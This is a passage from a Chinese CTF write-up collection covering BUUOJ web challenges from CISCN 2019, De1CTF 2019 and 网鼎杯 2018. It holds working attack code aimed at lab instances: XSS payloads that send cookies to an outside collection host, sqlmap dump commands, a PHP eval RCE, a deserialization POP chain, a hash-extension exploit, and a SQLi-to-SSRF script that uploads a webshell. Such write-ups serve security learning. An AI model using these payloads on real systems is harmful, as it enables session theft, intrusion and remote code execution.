Image();keep.src='http://xss.buuoj.cn/index.php?do=keepsession&id=U3widY&url='+escape(document.location)+'&cookie='+escape(document.cookie)}; 4026effd74d5780b0b55936f19dff219.html:1 Refused to load the image 'http://xss.buuoj.cn/index.php?do=api&id=U3widY&location=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post/4026effd74d5780b0b55936f19dff219.html&toplocation=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post/4026effd74d5780b0b55936f19dff219.html&cookie=_ga%3DGA1.2.2113857027.1593076385%3B%20PHPSESSID%3Def70ae11f5564d115dc99d63fe49ff02&opener=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post.php' because it violates the following Content Security Policy directive: \"default-src 'self'\". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback. 用跳转来绕过 (function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=U3wid&keepsession=0 &location='+escape((function(){try{return document.location.href}catch(e){return''}})())+ '&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+ '&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+ '&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})(); 然后拿到cookie可以进/admin.php了 存在sql注入，用sqlmap 跑一下就行 sqlmap -u \"http://cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/admin.php?id=2\" --cookie=\"PHPSESSID=b81d5f73388c74a98372f0bddcb6ba2d\" -p id -D ciscn -T flag --dump © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/ciscn-pre-2019.html":{"url":"buuoj/ciscn-pre-2019.html","title":"CISCN 2019 初赛","keywords":"","body":"[CISCN 2019 初赛]0x01 love_math[CISCN 2019 初赛] 0x01 love_math = 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 首页给了源码 思路很显然是利用数学函数getshell 一般可以利用dechex，base_convert base_convert有36进制，0-9+a-z,所以可以利用10进制数构造小写字母字符串，根据php特性，可以构造hex2bin 然后将dechex把10进制数转化成16进制的结果作为hex2bin参数,就可以任意构造字符串 参数的话可以用pi或者pow,这些没有过滤的字符串来替代 poc // phpinfo(); (base_convert(55490343972,10,36))(); 可以利用exec(getallheader(){8})拿到shell $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){8}) 在请求包里添加8: 即可RCE © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/ciscn-final-2019.html":{"url":"buuoj/ciscn-final-2019.html","title":"CISCN 2019 Final","keywords":"","body":"CISCN2019 总决赛[Day1 Web4]Laravel1CISCN2019 总决赛 [Day1 Web4]Laravel1 直接给源码 逻辑也很简单 就一行 class IndexController extends Controller { public function index(\\Illuminate\\Http\\Request $request){ $payload=$request->input(\"payload\"); if(empty($payload)){ highlight_file(__FILE__); }else{ @unserialize($payload);//这一行触发反序列化 } } } 看来是要自己构造POP链了， unserialize($payload)首先触发__destruct() __wakeup()这两个函数，在PhpStorm中使用CRTL+SHIFT+F 进行全局搜索。 找到 namespace Symfony\\Component\\Cache\\Adapter; class TagAwareAdapter implements TagAwareAdapterInterface, TagAwareCacheInterface, PruneableInterface, ResettableInterface { public function commit() { return $this->invalidateTags([]); } public function __destruct() { $this->commit(); } } 跟进invalidateTags([]) namespace Symfony\\Component\\Cache\\Adapter; class TagAwareAdapter implements TagAwareAdapterInterface, TagAwareCacheInterface, PruneableInterface, ResettableInterface { const TAGS_PREFIX = \"\\0tags\\0\"; use ProxyTrait; use ContractsTrait; private $deferred = []; private $createCacheItem; private $setCacheItemTags; private $getTagsByKey; private $invalidateTags; private $tags; private $knownTagVersions = []; private $knownTagVersionsTtl; public function invalidateTags(array $tags)//传入$tags是空的 { $ok = true; $tagsByKey = []; $invalidatedTags = []; ··· if ($this->deferred) { $items = $this->deferred;//$deferred我们可以控制 foreach ($items as $key => $item) { if (!$this->pool->saveDeferred($item)) { unset($this->deferred[$key]); $ok = false; } } $f = $this->getTagsByKey; $tagsByKey = $f($items); $this->deferred = []; } ··· return $ok; } } 然后我们看下$this->pool->SaveDeferred()是不是可控的，关键是SaveDeferred()因为$pool是可控的 找到PhpArrayAdapter.php class TagAwareAdapter implements TagAwareAdapterInterface, TagAwareCacheInterface, PruneableInterface, ResettableInterface { const TAGS_PREFIX = \"\\0tags\\0\"; use ProxyTrait; use ContractsTrait; private $deferred = []; private $createCacheItem; private $setCacheItemTags; private $getTagsByKey; private $invalidateTags; private $tags; private $knownTagVersions = []; private $knownTagVersionsTtl; ... public function saveDeferred(CacheItemInterface $item) { if (null === $this->values) { $this->initialize();//这里调用了initialize(); } return !isset($this->keys[$item->getKey()]) && $this->pool->saveDeferred($item); } ... } 跟进看一下initialize() namespace Symfony\\Component\\Cache\\Traits; use Symfony\\Component\\Cache\\CacheItem; use Symfony\\Component\\Cache\\Exception\\InvalidArgumentException; use Symfony\\Component\\VarExporter\\VarExporter; trait PhpArrayTrait { use ProxyTrait;//表示继承ProxyTrait类 private $file; private $keys; private $values; private function initialize() { if (!file_exists($this->file)) { $this->keys = $this->values = []; return; } $values = (include $this->file) ?: [[], []];//可以看到这里有文件包含 if (2 !== \\count($values) || !isset($values[0], $values[1])) { $this->keys = $this->values = []; } else { list($this->keys, $this->values) = $values; } } } POP链 TagAwareAdapter->destruct()->commit()->invalidateTags()->$this->pool->saveDeferred($item) $this->pool: TagAwareAdapter->saveDeferred($item)->initialize()->this->$values = (include $this->file) 可以写出Exp(还得解决奇奇怪怪的类依赖问题，要多扒几个类出来才能正常编译) expiry = 'eki23323'; $this->poolHash = '233'; $this->key = ''; } } } namespace Symfony\\Component\\Cache\\Adapter{ use Symfony\\Component\\Cache\\CacheItem; class TagAwareAdapter{ private $deferred = []; private $createCacheItem; private $setCacheItemTags; private $getTagsByKey; private $invalidateTags; private $tags; private $knownTagVersions = []; private $knownTagVersionsTtl; public function __construct() { $this->pool = new PhpArrayAdapter(); $this->deferred = array('flight' => new CacheItem()); } } class PhpArrayAdapter{ private $file='/flag'; public function __construct() { $this->file='/flag'; } } } namespace { use Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter; $tagAwareAdapter = new TagAwareAdapter(); echo urlencode(serialize($tagAwareAdapter)); } ?> 当然，找的时候可没有这么容易，因为有很多类看起来可以利用，但是最终能用的却不好找 还有一种POP链 TagAwareAdapter.php->destruct()->commit()->invalidateTags()->$this->pool->saveDeferred($item) ProxyAdapter.php >saveDeferred()->dosave()->($this->setInnerItem)(SinnerItem,$item) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/de1ctf-2019.html":{"url":"buuoj/de1ctf-2019.html","title":"De1CTF 2019","keywords":"","body":"[De1CTF 2019]0x01 SSRF Me参考资料0x02 ShellShellShell参考资料0x03 Giftbox[De1CTF 2019] 0x01 SSRF Me 靶机首页就是源码 Hint:提示flag is in ./flag.txt 所以我们得想办法读取这个文件,首先看有哪几个路由，分别有什么用 #generate Sign For Action Scan. 为scan创建一个标志? @app.route(\"/geneSign\", methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param) #核心功能 传参执行Task.Exec()并输出 @app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec()) #首页展示源码... @app.route('/ def index(): return open(\"code.txt\",\"r\").read() 看一下调用的类 class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr 利用md5对ip进行了限制“只能”访问外网 os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action:#如果是action是scan,就往路径下的/result.txt写东西 tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action:#如果是action是read,就往路径下的/result.txt读 f = open(\"./%s/result.txt\" % self.sandbox, 'r result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self):#检查签名 if (getSign(self.action, self.param) == self.sign): return True else: return False 可以看到有一些校验和waf拦截 还是先继续看核心功能代码 def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\" 显然我们要在这个param里面注类似”file:flag.txt“来拿到flag 但是被waf给拦了 def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return False gopher也不能用 但是这里只过滤了file没有过滤local_file，或者也可以直接flag.txt 参考：https://bugs.python.org/issue35907 这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问，也可以使用类似的 file:///app/flag.txt 去访问，但是 file 关键字在黑名单里，可以使用 local_file 代替 https://xz.aliyun.com/t/5927#toc-3 所以我们可以用local_file:///proc/self/cwd/flag.txt来访问 然后在action里scan+read就可以读文件了 执行还需要签名满足 getSign(self.action, self.param) == self.sign def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 因为secret_key是未知的，我们必须先调用geneSign去拿到签名，但该函数限定了action为scan怎么办？ 注意到这个是字符串直接拼一起的， 所以我们一开始调用 local_file:///proc/self/cwd/flag.txtread 就可以拿到对应的签名了 先写一个Exp框架 #coding=utf-8 import requests conn = requests.session() url = \"http://f3d586ad-6270-49ac-843c-3ca9b419ab4b.node3.buuoj.cn\" def geneSign(param): param = { \"param\": param, } resp = conn.get(url+\"./geneSign\",param=param).text print resp return resp def challenge(action,param,sign): param = { \"param\":param, } cookie = { \"action\": action, \"sign\": sign, } resp = conn.get(url+\"/De1ta\",param=param,cookie=cookie) print resp return resp 第二个绕开sign限制的方法还是挺有意思的,利用哈希扩展攻击 利用条件： 我们要知道salt（只能是前缀）的长度。 要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。 用户可以提交md5值。 这里的salt就是secret_key+filename 工具Hashpump root@EDI:~/HashPump# hashpump Input Signature: f173c63af1a6be383330bb97d7714446 Input Data: scan Input Key Length: 24 Input Data to Add: read 3ff498706cc3cfef41b86e94343ebe97 scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read 注意要将\\x80等字符转换为URL编码，否则会报400错误 Exp2: #coding=utf-8 import requests conn = requests.Session() url = \"http://f3d586ad-6270-49ac-843c-3ca9b419ab4b.node3.buuoj.cn\" def geneSign(param): data = { \"param\": param } resp = conn.get(url+\"/geneSign\",params=data).text print resp return resp def challenge(action,param,sign): cookie={ \"action\":action, \"sign\":sign } params={ \"param\":param } resp = conn.get(url+\"/De1ta\",params=params,cookies=cookie).text return resp filename = \"flag.txt\" #长度为8 +16位的key 24位 payload = \"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read\" sign = \"3ff498706cc3cfef41b86e94343ebe97\" print challenge(payload,filename,sign) 参考资料 https://www.cnblogs.com/20175211lyz/p/11440316.html 0x02 ShellShellShell 拿到源码，据说原来是.swp文件的泄露，但是buuoj上貌似么有，就直接拿源码了 可以找到攻击点 //views/publish if($C->is_admin==0) { ... else{ echo \"Hello \".$C->username.\"\"; echo \"Orz...大佬果然进来了!但jaivy说flag不在这,要flag,来内网拿...\"; if(isset($_FILES['pic'])){ $res = @$C->publish(); if($res){ echo \"alert('ok;self.location='index.php?action=publish'; \"; exit; } else { echo \"alert('something error;self.location='index.php?action=publish'; \"; } } ?> $C是Customer类 username = isset($_SESSION['username'])?$_SESSION['username']:''; $this->userid = isset($_SESSION['userid'])?$_SESSION['userid']:-1; $this->is_admin = isset($_SESSION['is_admin'])?$_SESSION['is_admin']:0; $this->get_allow_diff_ip(); } public function check_login() { return isset($_SESSION['userid']); } public function check_username($username) { if(preg_match('/[^a-zA-Z0-9_]/is',$username) or strlen($username)20) return false; else return true; } private function is_exists($username) { $db = new Db(); @$ret = $db->select('username','ctf_users',\"username='$username'\"); if($ret->fetch_row()) return true; else return false; } public function get_allow_diff_ip() { if(!$this->check_login()) return 0; $db = new Db(); @$ret = $db->select('allow_diff_ip','ctf_users','id='.$this->userid); if($ret) { $user = $ret->fetch_row(); if($user) { $this->allow_diff_ip = (int)$user[0]; return 1; } else return 0; } } function login() { if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['code'])) { if(substr(md5($_POST['code']),0, 5)!==$_SESSION['code']) { die(\"code erroar\"); } $username = $_POST['username']; $password = md5($_POST['password']); if(!$this->check_username($username)) die('Invalid user name; $db = new Db(); @$ret = $db->select(array('id','username','ip','is_admin','allow_diff_ip,'ctf_users',\"username = '$username' and password = '$password' limit 1\"); if($ret) { $user = $ret->fetch_row(); if($user) { if ($user[4] == '0' && $user[2] !== get_ip()) die(\"You can only login at the usual address\"); if ($user[3] == '1 $_SESSION['is_admin'] = 1; else $_SESSION['is_admin'] = 0; $_SESSION['userid'] = $user[0]; $_SESSION['username'] = $user[1]; $this->username = $user[1]; $this->userid = $user[0]; return true; } else return false; } else { return false; } } else return false; } function register() { if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['code'])) { if(substr(md5($_POST['code']),0, 5)!==$_SESSION['code']) { die(\"code error\"); } $username = $_POST['username']; $password = md5($_POST['password']); if(!$this->check_username($username)) die('Invalid user name; if(!$this->is_exists($username)) { $db = new Db(); @$ret = $db->insert(array('username','password','ip','is_admin','allow_diff_ip,'ctf_users',array($username,$password,get_ip(),'0','1); //No one could be admin except me if($ret) return true; else return false; } else { die(\"The username is not unique\"); } } else { return false; } } function publish() { if(!$this->check_login()) return false; if($this->is_admin == 0) { if(isset($_POST['signature']) && isset($_POST['mood'])) { $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip()))); $db = new Db(); @$ret = $db->insert(array('userid','username','signature','mood,'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood)); if($ret) return true; else return false; } } else { if(isset($_FILES['pic'])) { $dir='/app/upload/'; move_uploaded_file($_FILES['pic']['tmp_name'],$dir.$_FILES['pic']['name']); echo \"alert('\".$_FILES['pic']['name'].\"upload success;\"; return true; } else return false; } } function showmess() { if(!$this->check_login()) return false; if($this->is_admin == 0) { //id,sig,mood,ip,country,subtime $db = new Db(); @$ret = $db->select(array('username','signature','mood','id,'ctf_user_signature',\"userid = $this->userid order by id desc\"); if($ret) { $data = array(); while ($row = $ret->fetch_row()) { $sig = $row[1]; $mood = unserialize($row[2]); $country = $mood->getcountry(); $ip = $mood->ip; $subtime = $mood->getsubtime(); $allmess = array('id'=>$row[3],'sig' => $sig, 'mood' => $mood, 'ip' => $ip, 'country' => $country, 'subtime' => $subtime); array_push($data, $allmess); } $data = json_encode(array('code'=>0,'data'=>$data)); return $data; } else return false; } else { $filenames = scandir('adminpic/; array_splice($filenames, 0, 2); return json_encode(array('code'=>1,'data'=>$filenames)); } } function allow_diff_ip_option() { if(!$this->check_login()) return false; if($this->is_admin == 0) { if(isset($_POST['adio'])){ $db = new Db(); @$ret = $db->update_single('ctf_users',\"id = $this->userid\",'allow_diff_ip',(int)$_POST['adio']); if($ret) return true; else return false; } } else echo 'admin can\\'t change this option'; return false; } function deletemess() { if(!$this->check_login()) return false; if(isset($_GET['delid'])) { $delid = (int)$_GET['delid']; $db = new Db; @$ret = $db->delete('ctf_user_signature', \"userid = $this->userid and id = '$delid'\"); if($ret) return true; else return false; } else return false; } } 要让is_admin=1 username和password显然都没法注，只有看看ip了 跟进看一下get_ip是 function get_ip(){ return $_SERVER['REMOTE_ADDR']; } ... 这也没法注 那么要去看看数据库的底层操作 class Db { private $servername = \"localhost\"; private $username = \"jaivy\"; private $password = \"***********\";#you don't know! private $dbname = \"jaivyctf\"; private $conn; function __construct() { $this->conn = new mysqli($this->servername, $this->username, $this->password, $this->dbname); } function __destruct() { $this->conn->close(); } private function get_column($columns){ if(is_array($columns)) $column = ' `'.implode('`,`',$columns).'` '; else $column = ' `'.$columns.'` '; return $column; } public function select($columns,$table,$where) { $column = $this->get_column($columns); $sql = 'select '.$column.' from '.$table.' where '.$where.';'; $result = $this->conn->query($sql); return $result; } public function insert($columns,$table,$values){ $column = $this->get_column($columns); $value = '('.preg_replace('/`([^`,]+)`/','\\'${1}\\'',$this->get_column($values)).'; //preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed $nid = $sql = 'insert into '.$table.'('.$column. values '.$value; $result = $this->conn->query($sql); return $result; } public function delete($table,$where){ $sql = 'delete from '.$table.' where '.$where; $result = $this->conn->query($sql); return $result; } public function update_single($table,$where,$column,$value){ $sql = 'update '.$table.' set `'.$column.'` = \\''.$value.'\\' where '.$where; $result = $this->conn->query($sql); return $result; } } 关键在于insert函数 正常流程效果如下 $column $value replace前 $value replace 后 大致意思就是因为没过滤反引号： preg_replace('/`([^`,]+)`/','\\'${1}\\'',get_column($values)) //[^`,] 这个正则的意思就是除开 ` 和 ,字符去匹配其他字符。 其实就是处理value是数组的情况 //这段代码的功能就是把`1` => '1' //但是对于 1`or# => `1`or#` (没有可以切割的) //然后进行替换的时候(他是根据``配对来匹配的)先匹配了前面的`1`然后后面的or#`就逃逸出单引号了，导致了注入 https://xz.aliyun.com/t/6050#toc-10 既然能单引号逃逸，然后就是想办法注入了 register处肯定没办法了，因为参数不可控 还有一处insert是在pulish里 function publish() { if(!$this->check_login()) return false; if($this->is_admin == 0) { if(isset($_POST['signature']) && isset($_POST['mood'])) { $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip()))); $db = new Db(); @$ret = $db->insert(array('userid','username','signature','mood,'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));//这里vaule的signature可控，那么就存在注入 if($ret) return true; else return false; } } else { if(isset($_FILES['pic'])) { $dir='/app/upload/'; move_uploaded_file($_FILES['pic']['tmp_name'],$dir.$_FILES['pic']['name']); echo \"alert('\".$_FILES['pic']['name'].\"upload success;\"; return true; } else return false; } } poc signature= 1`,0x41)#&mood=0 可以看到返回了ok 然后写给sqlmap的temper 用sqlmap跑盲注 # sqlmap/tamper/backquotes.py from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOWEST def dependencies(): pass def tamper(payload, **kwargs): return \"1`,\"+payload+\")#\" 然后拿到admin 的密码（md5）反解后得到jaivypassword 但是admin只能127.0.0.1登录，这里需要通过SOAP借助PHP反序列化来搞SSRF 可以看到之前publish里面 $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip()))); 所以$mood是一个序列化对象,利用之前的逃逸，这部分事实上是完全可控的。 看下反序列化过程 function showmess() { if(!$this->check_login()) return false; if($this->is_admin == 0) { //id,sig,mood,ip,country,subtime $db = new Db(); @$ret = $db->select(array('username','signature','mood','id,'ctf_user_signature',\"userid = $this->userid order by id desc\"); if($ret) { $data = array(); while ($row = $ret->fetch_row()) { $sig = $row[1]; $mood = unserialize($row[2]);//这里直接反序列化了，所以可以利用SOAP来SSRF $country = $mood->getcountry(); $ip = $mood->ip; $subtime = $mood->getsubtime(); $allmess = array('id'=>$row[3],'sig' => $sig, 'mood' => $mood, 'ip' => $ip, 'country' => $country, 'subtime' => $subtime); array_push($data, $allmess); } $data = json_encode(array('code'=>0,'data'=>$data)); return $data; } else return false; } else { $filenames = scandir('adminpic/; array_splice($filenames, 0, 2); return json_encode(array('code'=>1,'data'=>$filenames)); } } 具体可以利用这个脚本（https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540 N1CTF easyphp的脚本改了改） import re import sys import string import random import requests import subprocess from itertools import product _target = 'http://98da48cd-28a8-4faa-b97a-bf6e8af3b749.node3.buuoj.cn/index.php/' _action = _target + 'index.php?action=' def get_creds(): username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)) password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)) return username, password def solve_code(html): code = re.search(r'Code\\(substr\\(md5\\(\\?\\), 0, 5\\) === ([0-9a-f]{5})\\)', html).group(1) solution = subprocess.check_output(['grep', '^'+code, 'captchas.txt']).split()[2] return solution def register(username, password): resp = sess.get(_action+'register code = solve_code(resp.text) sess.post(_action+'register', data={'username':username,'password':password,'code':code}) return True def login(username, password): resp = sess.get(_action+'login code = solve_code(resp.text) sess.post(_action+'login', data={'username':username,'password':password,'code':code}) return True def publish(sig, mood): return sess.post(_action+'publish', data={'signature':sig,'mood':mood})#, proxies={'http':'127.0.0.1:8080'}) def get_prc_now(): # date_default_timezone_set(\"PRC\") is not important return subprocess.check_output(['php', '-r', 'date_default_timezone_set(\"PRC\"); echo time();']) def get_admin_session(): sess = requests.Session() resp = sess.get(_action+'login code = solve_code(resp.text) return sess.cookies.get_dict()['PHPSESSID'], code def brute_filename(prefix, ts, sessid): ds = [''.join(i) for i in product(string.digits, repeat=3)] ds += [''.join(i) for i in product(string.digits, repeat=2)] # find uploaded file in max 1100 requests for d in ds: f = prefix + ts + d + '.jpg' resp = requests.get(_target+'adminpic/'+f, cookies={'PHPSESSID':sessid}) if resp.status_code == 200: return f return False print '[+] creating user session to trigger ssrf' sess = requests.Session() username, password = get_creds() print '[+] register({}, {})'.format(username, password) register(username, password) print '[+] login({}, {})'.format(username, password) login(username, password) print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID'] + ' ' print '[+] getting fresh session to be authenticated as admin' phpsessid, code = get_admin_session() print code ssrf = 'http://127.0.0.1/\\x0d\\x0aContent-Length:0\\x0d\\x0a\\x0d\\x0a\\x0d\\x0aPOST /index.php?action=login HTTP/1.1\\x0d\\x0aHost: 127.0.0.1\\x0d\\x0aCookie: PHPSESSID={}\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0aContent-Length: 46\\x0d\\x0a\\x0d\\x0ausername=admin&password=jaivypassword&code={}\\x0d\\x0a\\x0d\\x0aPOST /foo\\x0d\\x0a'.format(phpsessid, code) mood = 'O:10:\\\"SoapClient\\\":4:{{s:3:\\\"uri\\\";s:{}:\\\"{}\\\";s:8:\\\"location\\\";s:39:\\\"http://127.0.0.1/index.php?action=login\\\";s:15:\\\"_stream_context\\\";i:0;s:13:\\\"_soap_version\\\";i:1;}}'.format(len(ssrf), ssrf)#这里是利用SOAP打内网的套路 mood = '0x'+''.join(map(lambda k: hex(ord(k))[2:].rjust(2, '0, mood)) payload = 'a`, {}); -- -'.format(mood)#这里利用了之前的单引号逃逸 print '[+] final sqli/ssrf payload: ' + payload print '[+] injecting payload through sqli' resp = publish(payload, '0 print '[+] triggering object deserialization -> ssrf' sess.get(_action+'index#, proxies={'http':'127.0.0.1:8080'}) print '[+] admin session => ' + phpsessid # switching to admin session sess = requests.Session() sess.cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': phpsessid}) print '[+] uploading stager' shell = {'pic': ('eki.php', \" 关于验证码的问题，这个脚本是利用源代码生成验证码的操作直接查表 function rand_s($length = 8) { $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|'; $password = ''; for ( $i = 0; $i 利用这个脚本来生成表 import hashlib from itertools import product c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|' captchas = [''.join(i) for i in product(c, repeat=3)] print '[+] Genering {} captchas...'.format(len(captchas)) with open('captchas.txt', 'w as f: for k in captchas: f.write(hashlib.md5(k).hexdigest()+' --> '+k+'\\n 拿到shell以后继续打内网 curl 173.188.198.10 拿到下一步 filename 使用数组赋值可以绕过 然后后面一个利用../ 路径穿越 exp \"http://173.188.198.10\", CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => \"\", CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 30, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => \"POST\", CURLOPT_POSTFIELDS => \"------WebKitFormBoundary1234567890\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"glzjin2.php\\\"\\r\\nContent-Type: false\\r\\n\\r\\n@ array( \"cache-control: no-cache\", \"content-type: multipart/form-data; boundary=----WebKitFormBoundary1234567890\" ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \"cURL Error #:\" . $err; } else { echo $response; } 参考资料 https://www.zhaoj.in/read-6170.html https://www.cnblogs.com/linuxsec/articles/10002646.html 2018-n1ctf/web/easy-php-540： https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540 https://xz.aliyun.com/t/6050#toc-11 2018上海市大学生信息安全竞赛web题解： https://xi4or0uji.github.io/2018/11/06/2018%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/ 0x03 Giftbox login 命令 username 盲注 这里直接起个flask代理跑totp验证 参数在main.js里都可以找到 #coding=utf-8 from flask import Flask,request import urllib import pyotp import requests app = Flask(__name__) totp = pyotp.TOTP('GAXG24JTMZXGKZBU',8 ,interval=5) s = requests.session() @app.route('/sql def attack_sql(): attack_url =\"http://7a8eeaa2-2dec-40d8-b986-d4ed4e9525ff.node3.buuoj.cn/shell.php\" username = urllib.unquote(request.args.get('username).replace(' ','/**/ params = { 'a' : 'login {0} admin'.format(username), 'totp' : totp.now() } r= s.get(attack_url,params=params) return r.content if __name__ == '__main__': app.run(debug=True, host='127.0.0.1 然后因为没有过滤直接sqlmap跑就行了 sqlmap -u \"http://127.0.0.1:5000/sql?username=admin\" -p username -D giftbox -T users --dump --batch 拿到密码和hint +------+----------+--------------------------------------------------+ | id | username | password | +------+----------+--------------------------------------------------+ | 1 | admin | hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333} | +------+----------+--------------------------------------------------+ 登陆后输入隐藏command后 we add an evil monster named 'eval' when launching missiles. 提示launch时使用了eval targeting 有对注入命令长度有限制，利用拼接绕过 再绕过open_basedir的限制 chdir('js');ini_set('open_basedir','..');chdir('..');chdir('/');ini_set('open_basedir','/');printf(file_get_contents('flag')); => targeting a chr targeting b {$a(46)} targeting c {$b}{$b} targeting d {$a(47)} targeting e js targeting f open_basedir targeting g chdir targeting h ini_set targeting i file_get_ targeting j {$i}contents targeting k {$g($e)} targeting l {$h($f,$c)} targeting m {$g($c)} targeting n {$h($f,$d)} targeting o {$d}flag targeting p {$j($o)} targeting q printf targeting r {$q($p)} © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/wangdingcup-2018.html":{"url":"buuoj/wangdingcup-2018.html","title":"网鼎杯 2018","keywords":"","body":"[网鼎杯 2018]0x01 Fakebook参考资料CommentUnfinished[网鼎杯 2018] 0x01 Fakebook 有robots.txt User-agent: * Disallow: /user.php.bak 访问一下拿到源码 name = $name; $this->age = (int)$age; $this->blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this->get($this->blog); } public function isValidBlog () { $blog = $this->blog; return 